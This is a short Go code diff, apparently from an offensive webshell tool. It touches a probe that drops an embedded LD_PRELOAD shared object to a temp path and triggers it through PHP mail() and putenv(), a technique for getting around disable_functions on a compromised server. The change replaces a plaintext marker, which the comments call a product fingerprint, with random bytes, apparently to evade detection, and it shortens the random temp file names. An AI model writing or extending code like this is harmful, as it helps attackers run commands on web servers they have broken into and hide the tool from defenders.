@@ -38,7 +38,9 @@ var ldpreloadSO []byte
 const (
 	// ldpreloadMagic 定位 .so 内的路径槽:magic 后紧跟 ldpreloadPathLen 字节的
 	// C 字符串槽(构造器 open 的目标路径,投递前改写为探活标记文件路径)。
-	ldpreloadMagic   = "ARTEXLDPATHv1\x00\x00\x00"
+	// 批 7 P0-4:magic 是一次性随机的 16 字节无语义值(原 "ARTEXLDPATHv1" 是
+	// 明文产品指纹);它与内嵌 .so 在构建期绑定,由 ldpreloadgen 同步生成。
+	ldpreloadMagic   = "\x73\x62\xb6\xd6\x97\x17\x14\x4e\x54\x3c\xec\x37\x36\x4d\xf1\x73"
 	ldpreloadPathLen = 128
 	// bypassTriggerTimeout 是 mail() 触发探针的超时(sendmail 派生可能慢)。
 	bypassTriggerTimeout = 30 * time.Second
@@ -77,8 +79,8 @@ func randHex(n int) string {
 // 只在 exec 系全禁且 mail()+putenv() 可用时调用。探测失败不拖垮登记:
 // 原因如实写进 info.BypassNote(诚实语义,不伪造可用)。
 func (s *HTTPShell) probeBypass(ctx context.Context, info *ProbeInfo) {
-	soPath := defaultTmpPrefix + randHex(6) + ".so"
-	markPath := defaultTmpPrefix + randHex(6) + ".mark"
+	soPath := defaultTmpPrefix + randHex(5) + ".so"
+	markPath := defaultTmpPrefix + randHex(5) + ".mark"
 	blob, err := patchLDPreloadPath(ldpreloadSO, markPath)
 	if err != nil {
 		info.BypassNote = err.Error()
